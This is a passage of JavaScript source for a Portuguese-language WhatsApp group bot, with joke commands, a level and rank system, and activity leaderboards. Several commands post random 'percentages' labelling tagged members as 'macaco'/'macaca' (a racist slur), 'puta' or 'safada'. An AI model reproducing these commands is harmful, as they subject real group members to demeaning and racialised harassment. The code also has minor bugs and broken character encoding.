random = `${Math.floor(Math.random() * 110)}`
await yoko.sendMessage(from, {image: {url: imgsafado}, caption: `O quanto *@${sender_ou_n.split("@")[0]}* pode ser uma pessoa safada?\nâ€¢ A porcentagem de chance Ã© *${random}%*`, mentions: [sender_ou_n]}, {quoted: selo})
}, 7000)
break

case 'macaco':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
await yoko.sendMessage(from, {text:`Pesquisando a sua ficha de macaco @${sender_ou_n.split("@")[0]} aguarde...`, mentions: [sender_ou_n]}, {quoted: selo})
 setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
await yoko.sendMessage(from, {image: {url: imgmacaco}, caption: `O quanto *@${sender_ou_n.split("@")[0]}* pode ser um macaco?\nâ€¢ A porcentagem de chance Ã© *${random}%*`, mentions: [sender_ou_n]}, {quoted: selo})
}, 7000)
break

case 'macaca':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
await yoko.sendMessage(from, {text:`Pesquisando a sua ficha de macaca @${sender_ou_n.split("@")[0]} aguarde...`, mentions: [sender_ou_n]}, {quoted: selo})
 setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
await yoko.sendMessage(from, {image: {url: imgmacaca}, caption: `O quanto *@${sender_ou_n.split("@")[0]}* pode ser uma macaca?\nâ€¢ A porcentagem de chance Ã© *${random}%*`, mentions: [sender_ou_n]}, {quoted: selo})
}, 7000)
break

case 'puta':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
await yoko.sendMessage(from, {text:`Pesquisando a sua ficha de puta @${sender_ou_n.split("@")[0]} aguarde...`, mentions: [sender_ou_n]}, {quoted: selo})
 setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
await yoko.sendMessage(from, {image: {url: imgputa}, caption: `O quanto *@${sender_ou_n.split("@")[0]}* pode ser uma puta?\nâ€¢ A porcentagem de chance Ã© *${random}%*`, mentions: [sender_ou_n]}, {quoted: selo})
}, 7000)
break

case 'morte': case 'death':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
if (args.length == 0) return reply(`EstÃ¡ faltando o nome da pessoa! Por exemplo: ${prefix+command} Victor`)
predea = await axios.get(`https://api.agify.io/?name=${encodeURIComponent(args[0])}`);
if (predea.data.age == null) return reply(`VocÃª inseriu um nome invalido, certifique-se de inserir um sem acentos, emojis, nÃºmeros e outros.`);
await yoko.sendMessage(from, {video: {url: deathcmd}, gifPlayback: true, caption: `Pessoas com este nome citado â€œ${predea.data.name}â€ tendem a morrer aos ${predea.data.age} anos.`, mentions: [sender]}, {quoted: selo});
break				
				
case 'matar': case 'mata':  
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
if(!menc_os2 || menc_jid2[1]) return reply('marque o alvo que vocÃª quer matar, a mensagem ou o @')
yoko.sendMessage(from, {video: {url: matarcmd}, gifPlayback: true, caption: `VocÃª acabou de matar o(a) *@${menc_os2.split('@')[0]}*, seu... ğŸ˜µâ€ğŸ’«ğŸ’…ğŸ»`, mentions: [menc_os2]}, {quoted: selo})
break 

case 'beijo':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
if(!menc_os2 || menc_jid2[1]) return reply('Marque a pessoa que vocÃª quer beijar, a mensagem ou o @');
await yoko.sendMessage(from, {video: {url: beijocmd}, gifPlayback: true, caption: `VocÃª acabou de mandar um beijo gostoso para o(a) *@${menc_os2.split('@')[0]}*!` , mentions: [menc_os2]}, {quoted: selo})
break

case 'tapa':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
if(!menc_os2 || menc_jid2[1]) return reply('Marque o alvo que vocÃª quer da um tapa, a mensagem ou o @.')
await yoko.sendMessage(from, {video: {url: tapacmd}, gifPlayback: true, caption: `VocÃª acabou de da um tapa na raba da *@${menc_os2.split('@')[0]}*. ğŸ˜¼`, mentions: [menc_os2]}, {quoted: selo})
break

case 'chute':
case 'chutar':  
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix));
if(!menc_os2 || menc_jid2[1]) return reply('Marque o alvo que vocÃª quer da um chute, a mensagem ou o @')
await yoko.sendMessage(from, {video: {url: chutecmd}, gifPlayback: true, caption: `VocÃª acabou de dar um chute em *@${menc_os2.split('@')[0]}*.`, mentions: [menc_os2]}, {quoted: selo})
break 

case 'dogolpe':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
if(!menc_os2 || menc_jid2[1]) return reply('Marque a mensagem com o comando ou marque o @ do usuÃ¡rio..')
randomF = ["em iludir pessoas", "em ferir os sentimentos", "em dar chifre"]
await yoko.sendMessage(from, {text: `â™¦ï¸â˜ ï¸ *@${menc_os2.split("@")[0]}* Ã© especialista *${randomF[Math.floor(Math.random() * randomF.length)]}*.`, mentions: [menc_os2]}, {quoted: selo})
break

case 'shipo':
if(!isGroup) return reply(mess.onlyGroup());
if(!isModobn) return reply(mess.onlyGroupFun(prefix));
if(!menc_os2) return reply('Marque uma pessoa do grupo para encontrar o par dela.');
await mention(`â™¦ï¸ Eu shipo *@${groupMembers[Math.floor(Math.random() * groupMembers.length)].id.split('@')[0]} & @${menc_os2.split("@")[0]}* com uma porcentagem de *${Math.floor(Math.random() * 100)+"%"}*.`);
break


case 'rank': case 'ranklevel': case 'rankpatente':
if(!isGroup) return reply(mess.onlyAdmins())
if(!isLevelingOn) return reply(`Para usar o comando, primeiro o(s) admin(s) do grupo deve ativar o sistema de level.\nâ€¢ Solicite a 1 do(s) administrador(es) para ativar o comando. Usar: ${prefix}leveling`)
if(level2.length > 4) {
cortGG = level2.map(i => i)
rank = cortGG.sort((a, b) => (a.contador < b.contador) ? 0 : -1)
if(level2.length > 10) {var totalR = 10} else {var totalR = level2.length}
tc = `ğŸ–ï¸ Rank Level - [Type: *Global*]\nâ€“`
for ( i = 0; i < totalR; i++) {
  if(i != null) {
var newlevel = rank[i].contador
if(newlevel < 100){var newpatente = "Bronze I ğŸ¥‰"}; if(newlevel >= 100 && newlevel < 200){var newpatente = "Bronze II ğŸ¥‰"}; if(newlevel >= 200 && newlevel < 300){var newpatente = "Bronze III ğŸ¥‰"}; if(newlevel >= 300 && newlevel < 400){var newpatente = "Prata I ğŸ¥ˆ"}; if(newlevel >= 400 && newlevel < 500){var newpatente = "Prata II ğŸ¥ˆ"}; if(newlevel >= 500 && newlevel < 600){var newpatente = "Prata III ğŸ¥ˆ"}; if(newlevel >= 600 && newlevel < 700){var newpatente = "Ouro I ğŸ¥‡"}; if(newlevel >= 700 && newlevel < 800){var newpatente = "Ouro II ğŸ¥‡"}; if(newlevel >= 800 && newlevel < 900){var newpatente = "Ouro III ğŸ¥‡"}; if(newlevel >= 900 && newlevel < 1200){var newpatente = "Ouro IV ğŸ¥‡"}; if(newlevel >= 1200 && newlevel < 1500){var newpatente = "Platina I ğŸŒ€"}; if(newlevel >= 1500 && newlevel < 1800){var newpatente = "Platina II ğŸŒ€"}; if(newlevel >= 1800 && newlevel < 2100){var newpatente = "Platina III ğŸŒ€"}; if(newlevel >= 2100 && newlevel < 2700){var newpatente = "Platina IV ğŸŒ€"}; if(newlevel >= 2700 && newlevel < 3300){var newpatente = "Diamante I ğŸ’"}; if(newlevel >= 3300 && newlevel < 3900){var newpatente = "Diamante II ğŸ’"}; if(newlevel >= 3900 && newlevel < 4500){var newpatente = "Diamante III ğŸ’"}; if(newlevel >= 4500 && newlevel < 5000){var newpatente = "Diamante IV ğŸ’"}; if(newlevel >= 5000 && newlevel < 5500){var newpatente = "Paladino I â™¦ï¸"}; if(newlevel >= 5500 && newlevel < 6500){var newpatente = "Paladino II â™¦ï¸"}; if(newlevel >= 6500 && newlevel < 7500){var newpatente = "Paladino III â™¦ï¸"}; if(newlevel >= 7500 && newlevel < 9000){var newpatente = "Paladino IV â™¦ï¸"}; if(newlevel >= 9000 && newlevel < 10500){var newpatente = "Mestre I â¤ï¸â€ğŸ”¥"}; if(newlevel >= 10500 && newlevel < 12000){var newpatente = "Mestre II â¤ï¸â€ğŸ”¥"}; if(newlevel >= 12000 && newlevel < 13500){var newpatente = "Mestre III â¤ï¸â€ğŸ”¥"}; if(newlevel >= 13500 && newlevel < 15000){var newpatente = "Mestre IV â¤ï¸â€ğŸ”¥"}; if(newlevel >= 15000 && newlevel < 20000){var newpatente = "Mestre V â¤ï¸â€ğŸ”¥"}; if(newlevel >= 20000 && newlevel < 25000){var newpatente = "Desafiante I ğŸ‘‘"}; if(newlevel >= 25000 && newlevel < 30000){var newpatente = "Desafiante II ğŸ‘‘"}; if(newlevel >= 30000 && newlevel < 35000){var newpatente = "Desafiante III ğŸ‘‘"}; if(newlevel >= 35000 && newlevel < 40000){var newpatente = "Desafiante IV ğŸ‘‘"}; if(newlevel >= 40000 && newlevel < 50000){var newpatente = "Desafiante V ğŸ‘‘"}; if(newlevel >= 50000 && newlevel < 60000){var newpatente = "UsuÃ¡rio Superior I ğŸ“"}; if(newlevel >= 60000 && newlevel < 70000){var newpatente = "UsuÃ¡rio Superior II ğŸ“"}; if(newlevel >= 70000 && newlevel < 80000){var newpatente = "Mestre Supremo I ğŸª„"}; if(newlevel >= 80000 && newlevel < 90000){var newpatente = "Mestre Supremo II ğŸª„"}; if(newlevel >= 90000 && newlevel < 100000){var newpatente = "Mestre Supremo III ğŸª„"}; if(newlevel >= 100000 && newlevel < 150000){var newpatente = "Conquistador I âš’ï¸"}; if(newlevel >= 150000 && newlevel < 200000){var newpatente = "Conquistador II âš’ï¸"}; if(newlevel >= 200000 && newlevel < 300000){var newpatente = "Conquistador III âš’ï¸"}; if(newlevel >= 300000 && newlevel < 400000){var newpatente = "Desbravador I ğŸ›°ï¸"}; if(newlevel >= 400000 && newlevel < 500000){var newpatente = "Desbravador II ğŸ›°ï¸"}; if(newlevel >= 500000 && newlevel < 1000000){var newpatente = "Desbravador III ğŸ›°ï¸"}; if(newlevel >= 1000000 && newlevel < 1500000){var newpatente = "Grande Mestre I ğŸª©"}; if(newlevel >= 1500000 && newlevel < 2000000){var newpatente = "Grande Mestre II ğŸª©"}; if(newlevel >= 2000000 && newlevel < 5000000){var newpatente = "Grande Mestre III ğŸª©"}; if(newlevel >= 5000000 && newlevel < 10000000){var newpatente = "Legancy X âšœï¸"}; if(newlevel >= 10000000){var newpatente = "Veterano ğŸ©ğŸ¼â€â™‚ï¸"}
tc += `\n*${i+1}Â°.* â€¢ UsuÃ¡rio(a): *${rank[i].nick}*\nâ€¢ UsuÃ¡rio ID: *wa.me/${rank[i].id.split('@')[0]}*\nâ€¢ Quantidade Total de XP: *${rank[i].contador}*\nâ€¢ Atualmente a pessoa estÃ¡ no patente *${newpatente}*, no level: *${rank[i].level}*\nâ€”â€”â€”â€”`
}
}
reply(tc)
} else { 
reply(`Nenhum dado(s) foi retornado, tente novamente mais tardeï¸!`)
}
break

case 'patente':
case 'level':
if(!isGroup) return reply(mess.onlyAdmins())
if(!isLevelingOn) return reply(`Para usar o comando, primeiro o(s) admin(s) do grupo deve ativar o sistema de level.\nâ€¢ Solicite a 1 do(s) administrador(es) para ativar o comando. Usar: ${prefix}leveling`)
if(JSON.stringify(level2).includes(sender)) {
levelstts = level2.map(i => i.id).indexOf(sender)
var newlevel = level2[levelstts].contador
if(newlevel < 100) newpatente = "Bronze I"
if(newlevel >= 100 && newlevel < 200) newpatente = "Bronze II"
if(newlevel >= 200 && newlevel < 300) newpatente = "Bronze III"
if(newlevel >= 300 && newlevel < 400) newpatente = "Prata I"
if(newlevel >= 400 && newlevel < 500) newpatente = "Prata II"
if(newlevel >= 500 && newlevel < 600) newpatente = "Prata III"
if(newlevel >= 600 && newlevel < 700) newpatente = "Ouro I"
if(newlevel >= 700 && newlevel < 800) newpatente = "Ouro II"
if(newlevel >= 800 && newlevel < 900) newpatente = "Ouro III"
if(newlevel >= 900 && newlevel < 1200) newpatente = "Ouro IV"
if(newlevel >= 1200 && newlevel < 1500) newpatente = "Platina I"
if(newlevel >= 1500 && newlevel < 1800) newpatente = "Platina II"
if(newlevel >= 1800 && newlevel < 2100) newpatente = "Platina III"
if(newlevel >= 2100 && newlevel < 2700) newpatente = "Platina IV"
if(newlevel >= 2700 && newlevel < 3300) newpatente = "Diamante I"
if(newlevel >= 3300 && newlevel < 3900) newpatente = "Diamante II"
if(newlevel >= 3900 && newlevel < 4500) newpatente = "Diamante III"
if(newlevel >= 4500 && newlevel < 5000) newpatente = "Diamante IV"
if(newlevel >= 5000 && newlevel < 5500) newpatente = "Paladino I"
if(newlevel >= 5500 && newlevel < 6500) newpatente = "Paladino II"
if(newlevel >= 6500 && newlevel < 7500) newpatente = "Paladino III"
if(newlevel >= 7500 && newlevel < 9000) newpatente = "Paladino IV"
if(newlevel >= 9000 && newlevel < 10500) newpatente = "Mestre Iï¸"
if(newlevel >= 10500 && newlevel < 12000) newpatente = "Mestre IIï¸"
if(newlevel >= 12000 && newlevel < 13500) newpatente = "Mestre III"
if(newlevel >= 13500 && newlevel < 15000) newpatente = "Mestre IVï¸"
if(newlevel >= 15000 && newlevel < 20000) newpatente = "Mestre Vï¸"
if(newlevel >= 20000 && newlevel < 25000) newpatente = "Desafiante I"
if(newlevel >= 25000 && newlevel < 30000) newpatente = "Desafiante II"
if(newlevel >= 30000 && newlevel < 35000) newpatente = "Desafiante III"
if(newlevel >= 35000 && newlevel < 40000) newpatente = "Desafiante IV"
if(newlevel >= 40000 && newlevel < 50000) newpatente = "Desafiante V"
if(newlevel >= 50000 && newlevel < 60000) newpatente = "UsuÃ¡rio Superior I"
if(newlevel >= 60000 && newlevel < 70000) newpatente = "UsuÃ¡rio Superior II"
if(newlevel >= 70000 && newlevel < 80000) newpatente = "Mestre Supremo I"
if(newlevel >= 80000 && newlevel < 90000) newpatente = "Mestre Supremo II"
if(newlevel >= 90000 && newlevel < 100000) newpatente = "Mestre Supremo III"
if(newlevel >= 100000 && newlevel < 150000) newpatente = "Conquistador Iï¸"
if(newlevel >= 150000 && newlevel < 200000) newpatente = "Conquistador IIï¸"
if(newlevel >= 200000 && newlevel < 300000) newpatente = "Conquistador IIIï¸"
if(newlevel >= 300000 && newlevel < 400000) newpatente = "Desbravador I"
if(newlevel >= 400000 && newlevel < 500000) newpatente = "Desbravador IIï¸"
if(newlevel >= 500000 && newlevel < 1000000) newpatente = "Desbravador IIIï¸"
if(newlevel >= 1000000 && newlevel < 1500000) newpatente = "Grande Mestre I"
if(newlevel >= 1500000 && newlevel < 2000000) newpatente = "Grande Mestre II"
if(newlevel >= 2000000 && newlevel < 5000000) newpatente = "Grande Mestre III"
if(newlevel >= 5000000 && newlevel < 10000000) newpatente = "Legancy X"
if(newlevel >= 10000000) newpatente = "Veterano"
// Ã‰ usado na barra apresentada na msg, que vai ser encaminhada pelo bot quando UsuÃ¡rio executar o cmd 'level' ou 'patente'.
if(newpatente == "Bronze I") {newcont = 100; newtt = 0}
if(newpatente == "Bronze II") {newcont = 200; newtt = 100}
if(newpatente == "Bronze III") {newcont = 300; newtt = 200}
if(newpatente == "Prata I") {newcont = 400; newtt = 300}
if(newpatente == "Prata II") {newcont = 500; newtt = 400}
if(newpatente == "Prata III") {newcont = 600; newtt = 500}
if(newpatente == "Ouro I") {newcont = 700; newtt = 600}
if(newpatente == "Ouro II") {newcont = 800; newtt = 700}
if(newpatente == "Ouro III") {newcont = 900; newtt = 800}
if(newpatente == "Ouro IV") {newcont = 1200; newtt = 900}
if(newpatente == "Platina I") {newcont = 1500; newtt = 1200}
if(newpatente == "Platina II") {newcont = 1800; newtt = 1500}
if(newpatente == "Platina III") {newcont = 2100; newtt = 1800}
if(newpatente == "Platina IV") {newcont = 2700; newtt = 2100}
if(newpatente == "Diamante I") {newcont = 3300; newtt = 2700}
if(newpatente == "Diamante II") {newcont = 3900; newtt = 3300}
if(newpatente == "Diamante III") {newcont = 4500; newtt = 3900}
if(newpatente == "Diamante IV") {newcont = 5000; newtt = 4500}
if(newpatente == "Paladino I") {newcont = 5500; newtt = 5000}
if(newpatente == "Paladino II") {newcont = 6500; newtt = 5500}
if(newpatente == "Paladino III") {newcont = 7500; newtt = 6500}
if(newpatente == "Paladino IV") {newcont = 9000; newtt = 7500}
if(newpatente == "Mestre Iï¸") {newcont = 10500; newtt = 9000}
if(newpatente == "Mestre II") {newcont = 12000; newtt = 10500}
if(newpatente == "Mestre IIIï¸") {newcont = 13500; newtt = 12000}
if(newpatente == "Mestre IVï¸") {newcont = 15000; newtt = 13500}
if(newpatente == "Mestre Vï¸") {newcont = 20000; newtt = 15000}
if(newpatente == "Desafiante I") {newcont = 25000; newtt = 20000}
if(newpatente == "Desafiante II") {newcont = 30000; newtt = 25000}
if(newpatente == "Desafiante III") {newcont = 35000; newtt = 30000}
if(newpatente == "Desafiante IV") {newcont = 40000; newtt = 35000}
if(newpatente == "Desafiante V") {newcont = 50000; newtt = 40000}
if(newpatente == "UsuÃ¡rio Superior I") {newcont = 60000; newtt = 50000}
if(newpatente == "UsuÃ¡rio Superior II") {newcont = 70000; newtt = 60000}
if(newpatente == "Mestre Supremo I") {newcont = 80000; newtt = 70000}
if(newpatente == "Mestre Supremo II") {newcont = 90000; newtt = 80000}
if(newpatente == "Mestre Supremo III") {newcont = 100000; newtt = 90000}
if(newpatente == "Conquistador Iï¸") {newcont = 150000; newtt = 100000}
if(newpatente == "Conquistador II") {newcont = 200000; newtt = 150000}
if(newpatente == "Conquistador IIIï¸") {newcont = 300000; newtt = 200000}
if(newpatente == "Desbravador Iï¸") {newcont = 400000; newtt = 300000}
if(newpatente == "Desbravador IIï¸") {newcont = 500000; newtt = 400000}
if(newpatente == "Desbravador IIIï¸") {newcont = 1000000; newtt = 500000}
if(newpatente == "Grande Mestre I") {newcont = 1500000; newtt = 1000000}
if(newpatente == "Grande Mestre II") {newcont = 2000000; newtt = 1500000}
if(newpatente == "Grande Mestre III") {newcont = 5000000; newtt = 2000000}
if(newpatente == "Legancy Xï¸") {newcont = 10000000; newtt = 5000000}
// Barra de quanto falta para alcanÃ§ar o prÃ³ximo nÃ­vel.
if(newlevel < 10000000) {
  nagaPor = Number(Number(newlevel - newtt) / Number(newcont - newtt) * 100).toFixed(1)
  nagaibis = newcont - newlevel
if(nagaPor == 100) nagaPor = `ã€˜â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆã€™${nagaPor}%`
if(nagaPor < 100) returnP = `ã€˜â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’ã€™${nagaPor}%`
if(nagaPor < 90) returnP = `ã€˜â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’ã€™${nagaPor}%`
if(nagaPor < 80) returnP = `ã€˜â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’ã€™${nagaPor}%`
if(nagaPor < 70) returnP = `ã€˜â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’ã€™${nagaPor}%`
if(nagaPor < 60) returnP = `ã€˜â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’ã€™${nagaPor}%`
if(nagaPor < 50) returnP = `ã€˜â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’ã€™${nagaPor}%`
if(nagaPor < 40) returnP = `ã€˜â–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’ã€™${nagaPor}%`
if(nagaPor < 30) returnP = `ã€˜â–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’ã€™${nagaPor}%`
if(nagaPor < 20) returnP = `ã€˜â–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’ã€™${nagaPor}%`
if(nagaPor < 10) returnP = `ã€˜â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’ã€™${nagaPor}%`
} else {
returnP = ``
}
leveltxt = `â€¢ UsuÃ¡rio: *@${sender.split("@")[0]}*\nâ€¢ VocÃª estÃ¡ atualmente no level *${level2[levelstts].level}* e no patente *${newpatente}*\nâ€¢ Sua quantidade de XP Ã©: *${level2[levelstts].contador}*\n\t[â€¢] -> ${newlevel < 10000000 ? `*${returnP}*` : ``}\nâ€“\n${newlevel < 10000000 ? `${newlevel < 10000000 ? `â€¢ Para subir para o prÃ³ximo level, alcance essa quantidade: *${newcont}*.` : ``}\nâ€¢ Falta${Number(nagaibis) > 1 ? `m` : ``} apenas *${nagaibis} XP* para vocÃª upar para o prÃ³ximo level.` : `VocÃª jÃ¡ alcanÃ§ou a patente mÃ¡xima, ou seja, estÃ¡ muito a frente de todos.`}`
localeL = level2.map(i => i).sort((a, b) => (a.contador < b.contador) ? 0 : -1)
try {uk = await yoko.profilePictureUrl(sender)} catch(erro) {uk = 'https://telegra.ph/file/2fbfa46b4ea3baed434d1.jpg'}
gerarBufferLV = await getBuffer(uk); photoULV = await upload(gerarBufferLV)
await yoko.sendMessage(from, {image: {url: API_URL+`/api/canvas/levelcard?foto=${photoULV}&nome=${getName(sender)}&xp_before=${level2[levelstts].contador}&xp_after=${newcont}&level=${level2[levelstts].level}&ranking=${localeL.map(i => i.id).indexOf(sender) + 1}&fundo=${fundolevel}`}, caption: leveltxt, mentions: [sender]}, {quoted: selo})
} else {
reply(`Nenhuma informaÃ§Ã£o foi obtida sobre seu level/patente atual em sua solicitaÃ§Ã£o.\nâ€¢ *Tente novamente mais tarde!* Caso seja uma falha tÃ©cnica entre em contato com o(a) dono(a) do bot.`)
}
break

case 'addlevel':
if(!SoDono) return reply(mess.onlyOwner())
if(!q) return reply("Digite a quantidade de level que deseja adicionar...")
if(!Number(args[0])) return reply(args[0] + " nÃ£o Ã© nÃºmero...")
if(Number(args[0]) < 1) return reply("Tem que adicionar ao menos 1 level.")
if(q.includes(".")) return reply("NÃ£o pode nÃºmero decimal.")
AB = level2.map(i => i.id).indexOf(menc_prt ? menc_prt : sender)
level2[AB].level += Number(args[0])
fs.writeFileSync("./yoko/bunker/database/usuarios/leveling.json", JSON.stringify(level2))
reply(`${args[0]} leve${Number(args[0]) > 1 ? `is` : `l`} adicionado${Number(args[0]) > 1 ? `s` : ``} a este usuÃ¡rio...`)
break

case 'tirarlevel':
if(!SoDono) return reply(mess.onlyOwner())
if(!q) return reply("Digite a quantidade de level que deseja remover")
if(!Number(args[0])) return reply(args[0] + " nÃ£o Ã© nÃºmero...")
if(Number(args[0]) < 1) return reply("Tem que tirar ao menos 1 level.");
if(q.includes(".")) return reply("NÃ£o pode nÃºmero decimal.");
AB = level2.map(i => i.id).indexOf(menc_prt ? menc_prt : sender)
level2[AB].level -= Number(args[0]);
fs.writeFileSync("./yoko/bunker/database/usuarios/leveling.json", JSON.stringify(level2))
reply(`${args[0]} leve${Number(args[0]) > 1 ? `is` : `l`} retirado${Number(args[0]) > 1 ? `s` : ``} deste usuÃ¡rio...`);
break

case 'addxp':
if(!SoDono) return reply(mess.onlyOwner())
if(!q) return reply("Digite a quantidade de XP que deseja adicionar")
if(!Number(args[0])) return reply(args[0] + " nÃ£o Ã© nÃºmero...")
if(Number(args[0]) < 1) return reply("Tem que add ao menos 1 de XP")
if(q.includes(".")) return reply("NÃ£o pode nÃºmero decimal")
AB = level2.map(i => i.id).indexOf(menc_prt ? menc_prt : sender)
level2[AB].contador += Number(args[0])
fs.writeFileSync("./yoko/bunker/database/usuarios/leveling.json", JSON.stringify(level2))
reply(`${args[0]} experiÃªncia${Number(args[0]) > 1 ? `s` : ``} fo${Number(args[0]) > 1 ? `ram` : `i`} adicionada${Number(args[0]) > 1 ? `s` : ``} a este usuÃ¡rio...`)
break

case 'tirarxp':
if(!SoDono) return reply(mess.onlyOwner())
if(!q) return reply("Digite a quantidade de XP que deseja retirar")
if(!Number(args[0])) return reply(args[0] + " nÃ£o Ã© nÃºmero...")
if(Number(args[0]) < 1) return reply("Tem que tirar ao menos 1 de XP")
if(q.includes(".")) return reply("NÃ£o pode nÃºmero decimal")
AB = level2.map(i => i.id).indexOf(menc_prt ? menc_prt : sender)
level2[AB].contador -= Number(args[0])
fs.writeFileSync("./yoko/bunker/database/usuarios/leveling.json", JSON.stringify(level2))
reply(`${args[0]} experiÃªncia${Number(args[0]) > 1 ? `s` : ``} fo${Number(args[0]) > 1 ? `ram` : `i`} retirada${Number(args[0]) > 1 ? `s` : ``} deste usuÃ¡rio...`);
break

case 'blocklevel':
if(!SoDono) return reply(mess.onlyOwner())
if(!menc_os2) return reply("Marque o @ ou a mensagem da pessoa que deseja bloquear do contador.")
if(!JSON.stringify(level2).includes(menc_os2)) return reply("O usuÃ¡rio mencionado nÃ£o estÃ¡ presente no contador de mensagens.")
AB = level2.map(i => i.id).indexOf(menc_os2)
if(level2[AB].block == true) return reply("O usuÃ¡rio mencionado jÃ¡ estÃ¡ bloqueado no contador.")
level2[AB].block = true
fs.writeFileSync("./yoko/bunker/database/usuarios/leveling.json", JSON.stringify(level2))
reply("UsuÃ¡rio bloqueado do contador com sucesso... As interaÃ§Ãµes do mesmo nÃ£o serÃ£o mais contabilizadas!")
break

case 'unblocklevel':
if(!SoDono) return reply(mess.onlyOwner())
if(!menc_os2) return reply("Marque o @ ou a mensagem da pessoa que deseja bloquear do contador.")
if(!JSON.stringify(level2).includes(menc_os2)) return reply("O usuÃ¡rio mencionado nÃ£o estÃ¡ presente no contador de mensagens.");
AB = level2.map(i => i.id).indexOf(menc_os2)
if(level2[AB].block == false) return reply("O usuÃ¡rio mencionado nÃ£o estÃ¡ bloqueado atualmente!")
level2[AB].block = false
fs.writeFileSync("./yoko/bunker/database/usuarios/leveling.json", JSON.stringify(level2))
reply("UsuÃ¡rio desbloqueado do contador com sucesso! As interaÃ§Ãµes do usuÃ¡rio mencionado voltarÃ£o a ser contabilizadas.")
break

case 'blocklevel-list': case 'blocklevellist':
if(!SoDono) return reply(mess.onlyOwner())
txt = `[Total: *${level2.length}*] - Lista de usuÃ¡rios bloqueados do contador de XP:\n`
let blocklevellist = 0
for(i = 0; i < level2.length; i++) {
  if(level2[i].block == true) {
txt += `*${i+1}.* @${level2[i].id.split('@')[0]}\n`
blocklevellist += 1
}
}
txt += `\nâ€“\nâ€¢ Total de Bloqueados: *${blocklevellist}*`
if(blocklevellist > 0) {
await mention(txt);
} else {
reply("NÃ£o existe nenhum *usuÃ¡rio bloqueado* do contador XP.");
}
break

case 'rmlevel':
if(!SoDono) return reply(mess.onlyOwner())
if(!q && !menc_os2) return reply("Marque a pessoa que deseja apagar do contador.")
var qp = menc_os2 ? menc_os2 : q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(!JSON.stringify(level2).includes(qp)) return reply("O usuÃ¡rio mencionado nÃ£o estÃ¡ registrado no contador.")
AB = level2.map(i => i.id).indexOf(qp)
level2.splice(AB, 1)
fs.writeFileSync("./yoko/bunker/database/usuarios/leveling.json", JSON.stringify(level2))
reply("UsuÃ¡rio apagado foi contador com sucesso como o(a) senhor(a) pediu...")
break

case 'rankativos': 
case 'rankativo':   
if(!isGroup) return reply(mess.onlyGroup())
var i3 = countMessage.map(i => i.groupId).indexOf(from)
var blue = countMessage[i3].numbers.map(i => i)
blue.sort((a, b) => ((a.figus == undefined ? a.figus = 0 : a.figus + a.messages + a.cmd_messages) < (b.figus == undefined ? b.figus = 0 : b.figus + b.cmd_messages + b.messages)) ? 0 : -1)
menc = [] 
blad = `*ğŸ† Rank dos mais ativos no grupo:* ${groupName}\n`
for ( i = 0; i < (blue.length < 5 ? blue.length : 5); i++) {
if (i != null) blad += `\n*ğŸ… ${i + 1}Âº Lugar:* @${blue[i].id.split('@')[0]}\nâ€¢ Quantidade de mensagens encaminhadas: *${blue[i].messages}*\nâ€¢ Quantidade de comandos executados pelo usuÃ¡rio(a): *${blue[i].cmd_messages}*\nâ€¢ UsuÃ¡rio estÃ¡ conectado em um dispositivo: *${blue[i].aparelho}*\nâ€¢ Figurinhas encaminhadas pelo usuÃ¡rio(a) no grupo: *${blue[i].figus}*\n`
menc.push(blue[i].id)
}
await mentions(blad, menc, true)
break

case 'rankinativo':
case 'rankinativos':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
await ClearMembersInactive()
bule = []; bule2 = []; mentioned_jid = []
for(cag of countMessage[ind].numbers){
bule2.push(cag.id)
if(cag.messages <= 1){bule.push(cag)}}
bule.sort((a, b) => ((a.messages + a.cmd_messages) < (b.cmd_messages + b.messages)) ? 0 : -1)
boardi = `ğŸ—‘ *Rank dos mais inativos do grupo:* ${groupName}\n-\n`
if(bule.length == 0) boardi += 'âŒ Nenhum usuÃ¡rio inativo foi encontrado neste grupo.ï¸'
for ( i = 0; i < (bule.length < 5 ? bule.length : 5); i++) {
if (i != null) boardi += `*ğŸ… ${i + 1}Âº Lugar:* @${bule[i].id.split('@')[0]}\nâ€¢ Quantidade de mensagens enviadas pelo usuÃ¡rio(a): *${bule[i].messages}*\nâ€¢ Quantidade de comandos executados pelo usuÃ¡rio(a): *${bule[i].cmd_messages}*\nâ€¢ Figurinhas encaminhadas pelo usuÃ¡rio(a) no grupo: *${bule[i].aparelho}*\n\n`
mentioned_jid.push(bule[i].id)
} 
await mentions(boardi, mentioned_jid, true);
break

case 'checkativo':
if(!isGroup) return reply(mess.onlyGroup())
